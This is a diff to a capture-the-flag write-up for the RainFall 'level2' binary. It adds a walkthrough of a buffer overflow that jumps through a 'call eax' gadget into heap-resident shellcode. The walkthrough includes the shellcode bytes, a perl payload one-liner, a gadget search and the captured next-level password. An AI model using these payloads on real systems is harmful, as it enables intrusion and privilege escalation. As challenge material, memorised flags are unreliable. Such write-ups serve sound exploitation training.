@@ -84,7 +84,7 @@ Dump of assembler code for function p:
    0x08048516 <+66>:    call   0x80483a0 <printf@plt>       ; Call printf with parameters put on stack.
    0x0804851b <+71>:    mov    DWORD PTR [esp],0x1          ; Put 0x1 on stack at esp.
    0x08048522 <+78>:    call   0x80483d0 <_exit@plt>        ; Call exit, that is to say exit(1).
-   0x08048527 <+83>:    lea    eax,[ebp-0x4c]               ; 
+   0x08048527 <+83>:    lea    eax,[ebp-0x4c]
    0x0804852a <+86>:    mov    DWORD PTR [esp],eax
    0x0804852d <+89>:    call   0x80483f0 <puts@plt>
    0x08048532 <+94>:    lea    eax,[ebp-0x4c]
@@ -97,4 +97,50 @@ End of assembler dump.
 
 ## Exploit
 
-perl -e 'print "\x90"x62 . "\xeb\x14" . "\x90"x16 . "\xcf\x84\x04\x08" . "\x90"x20 . "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' > /tmp/level2
+After analysis, we know that we can't use a stack address in `eip`. Hopefully, `strdup` allows us to go on the heap
+where our string will be duplicated. Like in level1, we use this [online
+tool](http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to find the offset: 80.
+
+Here is how it works:
+1. The buffer will contain a shellcode to spawn a new shell.
+2. But, this buffer is both on the stack and the heap because of `strdup`. It returns the string pointer into `eax`.
+3. The filter (`eax & 0xb0000000`) avoid us to use stack addresses. We need to use the one on the heap. So we are going
+   to use a `call eax` instruction to jump to our buffer content (with the shell-code).
+
+So let's do it! First, design the shell code. 
+
+```
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
+
+is equivalent to:
+
+```C
+excve("/bin/sh", ["/bin/sh"], NULL);
+```
+
+Now, we need to look for a `call eax` instruction to get its address:
+
+```console
+level2@RainFall:~$ objdump -d -M intel level2 | grep "call   eax"
+ 80484cf:   ff d0                call   eax
+ 80485eb:   ff d0                call   eax
+```
+
+So now we have almost everything. We just need to add a `nop` sled and a `jump` instruction to avoid an infinite loop
+between the beginning of the buffer and the `call eax`. Let's dump it into a file:
+
+```console
+level2@RainFall:~$ perl -e 'print "\x90"x62 . "\xeb\x14" . "\x90"x16 . "\xcf\x84\x04\x08" . "\x90"x20 . "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"' > /tmp/level2
+```
+
+And you run:
+
+```console
+level2@RainFall:~$ cat /tmp/level2 - | ./level2
+...
+[hit return, some garbage display]
+...
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
